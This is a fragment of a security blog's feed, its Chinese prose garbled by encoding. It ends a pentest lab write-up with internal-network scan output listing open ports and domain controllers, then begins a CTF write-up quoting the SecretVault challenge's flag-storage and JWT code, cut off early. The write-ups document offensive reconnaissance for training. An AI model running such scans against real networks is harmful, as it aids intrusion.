href="#äºŒå±‚å†…ç½‘" class="headerlink" title="äºŒå±‚å†…ç½‘"></a>äºŒå±‚å†…ç½‘</h1><p>å¼€æ‰«</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23:9094<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:88<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>16:445<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:80<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>16:135<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23:8060<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23:80<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23:22<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:445<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:389<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:139<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3:135<span class="token punctuation">[</span>6<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>16:139<span class="token punctuation">[</span>8<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:22<span class="token punctuation">[</span>8<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8091<span class="token punctuation">[</span>8<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8090<span class="token punctuation">[</span>8<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43:445<span class="token punctuation">[</span>8<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43:135<span class="token punctuation">[</span>8<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43:139<span class="token punctuation">[</span>9<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48:445<span class="token punctuation">[</span>9<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48:139<span class="token punctuation">[</span>9<span class="token punctuation">.</span>1s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48:135<span class="token punctuation">[</span>10<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5:445<span class="token punctuation">[</span>10<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5:389<span class="token punctuation">[</span>10<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5:135<span class="token punctuation">[</span>10<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5:139<span class="token punctuation">[</span>10<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5:88<span class="token punctuation">[</span>14<span class="token punctuation">.</span>1s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ<span class="token punctuation">,</span> å‘ç° 27 ä¸ªå¼€æ”¾ç«¯å£<span class="token punctuation">[</span>14<span class="token punctuation">.</span>1s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: 27<span class="token punctuation">[</span>14<span class="token punctuation">.</span>1s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ<span class="token punctuation">[</span>14<span class="token punctuation">.</span>2s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª<span class="token punctuation">[</span>14<span class="token punctuation">.</span>7s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23        çŠ¶æ€ç :502 é•¿åº¦:3039   æ ‡é¢˜:GitLab is not responding <span class="token punctuation">(</span>502<span class="token punctuation">)</span><span class="token punctuation">[</span>15<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5ä¸»æœºå: DCadminå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ 172<span class="token punctuation">.</span>25<span class="token punctuation">.</span>12<span class="token punctuation">.</span>7      â””â”€ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5<span class="token punctuation">[</span>16<span class="token punctuation">.</span>6s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43ä¸»æœºå: IZMN9U6ZO3VTRPZå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43      â””â”€ 172<span class="token punctuation">.</span>26<span class="token punctuation">.</span>8<span class="token punctuation">.</span>12<span class="token punctuation">[</span>17<span class="token punctuation">.</span>3s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3ä¸»æœºå: DCå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ 172<span class="token punctuation">.</span>25<span class="token punctuation">.</span>12<span class="token punctuation">.</span>9      â””â”€ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3<span class="token punctuation">[</span>18<span class="token punctuation">.</span>5s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>16ä¸»æœºå: IZMN9U6ZO3VTRNZå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ 172<span class="token punctuation">.</span>23<span class="token punctuation">.</span>4<span class="token punctuation">.</span>12      â””â”€ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>16<span class="token punctuation">[</span>18<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48ä¸»æœºå: IZAYSXE6VCUHB4Zå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48<span class="token punctuation">[</span>20<span class="token punctuation">.</span>0s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> NetBios 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>48     PENTEST\IZAYSXE6VCUHB4Z<span class="token punctuation">[</span>21<span class="token punctuation">.</span>2s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> NetBios 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3      DC:DC<span class="token punctuation">.</span>pentest<span class="token punctuation">.</span>me                 Windows Server 2016 Standard 14393<span class="token punctuation">[</span>22<span class="token punctuation">.</span>1s<span class="token punctuation">]</span>     ç³»ç»Ÿä¿¡æ¯ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3 <span class="token namespace">[Windows Server 2016 Standard 14393]</span><span class="token punctuation">[</span>22<span class="token punctuation">.</span>5s<span class="token punctuation">]</span>     ç³»ç»Ÿä¿¡æ¯ 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5 <span class="token namespace">[Windows Server 2016 Standard 14393]</span><span class="token punctuation">[</span>22<span class="token punctuation">.</span>6s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>23:8060   çŠ¶æ€ç :404 é•¿åº¦:555    æ ‡é¢˜:404 Not Found<span class="token punctuation">[</span>22<span class="token punctuation">.</span>7s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> NetBios 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>5      DC:DCadmin<span class="token punctuation">.</span>pen<span class="token punctuation">.</span>me                Windows Server 2016 Standard 14393<span class="token punctuation">[</span>22<span class="token punctuation">.</span>7s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> NetBios 172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>43     PENTEST\IZMN9U6ZO3VTRPZ<span class="token punctuation">[</span>22<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8091   çŠ¶æ€ç :204 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜<span class="token punctuation">[</span>22<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>3         çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server<span class="token punctuation">[</span>22<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8090   çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8090/login<span class="token punctuation">.</span>action?os_destination=<span class="token operator">%</span>2Findex<span class="token punctuation">.</span>action&amp;permissionViolation=true<span class="token punctuation">[</span>25<span class="token punctuation">.</span>8s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8090/login<span class="token punctuation">.</span>action?os_destination=<span class="token operator">%</span>2Findex<span class="token punctuation">.</span>action&amp;permissionViolation=true çŠ¶æ€ç :200 é•¿åº¦:33804  æ ‡é¢˜:ç™»å½• <span class="token operator">-</span> Confluence<span class="token punctuation">[</span>26<span class="token punctuation">.</span>9s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> å‘ç°æŒ‡çº¹ ç›®æ ‡: http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>24<span class="token punctuation">.</span>7<span class="token punctuation">.</span>27:8090/login<span class="token punctuation">.</span>action?os_destination=<span class="token operator">%</span>2Findex<span class="token punctuation">.</span>action&amp;permissionViolation=true æŒ‡çº¹: <span class="token namespace">[ATLASSIAN-Confluence]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="DC-172-24-7-3-x2F-172-25-12-9"><a href="#DC-172-24-7-3-x2F-172-25-12-9" class="headerlink" title="DC - 172.24.7.3&#x2F;172.25.12.9"></a>DC - 172.24.7.3&#x2F;172.25.12.9</h1><h1 id="DCadmin-172-24-7-5-x2F-172-25-12-7"><a href="#DCadmin-172-24-7-5-x2F-172-25-12-7" class="headerlink" title="DCadmin - 172.24.7.5&#x2F;172.25.12.7"></a>DCadmin - 172.24.7.5&#x2F;172.25.12.7</h1><h1 id="IZMN9U6ZO3VTRPZ-172-24-7-43-x2F-172-26-8-12"><a href="#IZMN9U6ZO3VTRPZ-172-24-7-43-x2F-172-26-8-12" class="headerlink" title="IZMN9U6ZO3VTRPZ - 172.24.7.43&#x2F;172.26.8.12"></a>IZMN9U6ZO3VTRPZ - 172.24.7.43&#x2F;172.26.8.12</h1><h1 id="IZAYSXE6VCUHB4Z-172-24-7-48"><a href="#IZAYSXE6VCUHB4Z-172-24-7-48" class="headerlink" title="IZAYSXE6VCUHB4Z - 172.24.7.48"></a>IZAYSXE6VCUHB4Z - 172.24.7.48</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ²™ç ¾å¿«åˆ°æœŸäº†ï¼Œç´¢æ€§å¼€äº†ä¸ªæœ€è´µçš„æ‰“ï¼Œä½†æ˜¯å¤ªèœäº†è¿˜æ²¡æ‰“å®Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2024/02/10/__trashed/&quot;&gt;https://fushuling.com/index.php/2024/02/10/__trashed/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#1722473---17225129&quot;&gt;https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#1722473---17225129&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯S9</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/10/18/%E5%BC%BA%E7%BD%91%E6%9D%AFS9/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/10/18/%E5%BC%BA%E7%BD%91%E6%9D%AFS9/</id>
    <published>2025-10-18T01:03:48.000Z</published>
    <updated>2026-01-11T10:44:08.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/">https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/</a></p><p><a href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p><span id="more"></span><hr><h1 id="SecretVault"><a href="#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h1><p>å‰åç«¯åˆ†åˆ«é‡‡ç”¨ go å’Œ pythonï¼Œå¤–ç½‘åªæš´éœ²äº† go çš„è®¤è¯ä¸­é—´ä»¶ 5555 ç«¯å£ï¼Œç­¾åæœåŠ¡åœ¨ 4444 ç«¯å£ä¸Šï¼Œåç«¯ flask åœ¨ 5000 ç«¯å£</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    salt <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_bytes<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    password_hash <span class="token operator">=</span> hash_password<span class="token punctuation">(</span>password<span class="token punctuation">,</span> salt<span class="token punctuation">)</span>    user <span class="token operator">=</span> User<span class="token punctuation">(</span>        <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>        username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">,</span>        password_hash<span class="token operator">=</span>password_hash<span class="token punctuation">,</span>        salt<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    flagEntry <span class="token operator">=</span> VaultEntry<span class="token punctuation">(</span>        user_id<span class="token operator">=</span>user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span>        label<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">,</span>        login<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">,</span>        password_encrypted<span class="token operator">=</span>fernet<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        notes<span class="token operator">=</span><span class="token string">'This is the flag entry.'</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>flagEntry<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag è¢« Fernet åŠ å¯†åå­˜å…¥æ•°æ®åº“</p><p>åç«¯åªæä¾›ä»¥ä¸‹è·¯ç”±ï¼š</p><p>&#x2F;register å’Œ &#x2F;login</p><p>&#x2F;dashboardï¼šå¯ä»¥æŸ¥çœ‹å¹¶æ“ä½œå½“å‰ç”¨æˆ·ä¸‹çš„æ•°æ®</p><p>&#x2F;passwords&#x2F;newï¼šæ’å…¥æ•°æ®</p><p>&#x2F;passwords&#x2F;<a href="int:entry_id">int:entry_id</a>ï¼šæŒ‡å®š id åˆ é™¤æ•°æ®</p><p>é¦–å…ˆè¿˜æ˜¯å°è¯•ç™»å½•åˆ° adminï¼Œç”±äºå¯†ç æ˜¯éšæœºçš„ï¼Œè§‚å¯Ÿ jwt</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> <span class="token punctuation">(</span>SecretKey <span class="token operator">=</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span><span class="token function">RandomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">SignToken</span><span class="token punctuation">(</span>uid <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>t <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> AuthClaims<span class="token punctuation">&#123;</span>UID<span class="token punctuation">:</span> uid<span class="token punctuation">,</span>RegisteredClaims<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span>RegisteredClaims<span class="token punctuation">&#123;</span>Issuer<span class="token punctuation">:</span>    <span class="token string">"Authorizer"</span><span class="token punctuation">,</span>Subject<span class="token punctuation">:</span>   uid<span class="token punctuation">,</span>ExpiresAt<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Hour<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>IssuedAt<span class="token punctuation">:</span>  jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NotBefore<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>tokenString<span class="token punctuation">,</span> err <span class="token operator">:=</span> t<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>SecretKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> tokenString<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>key 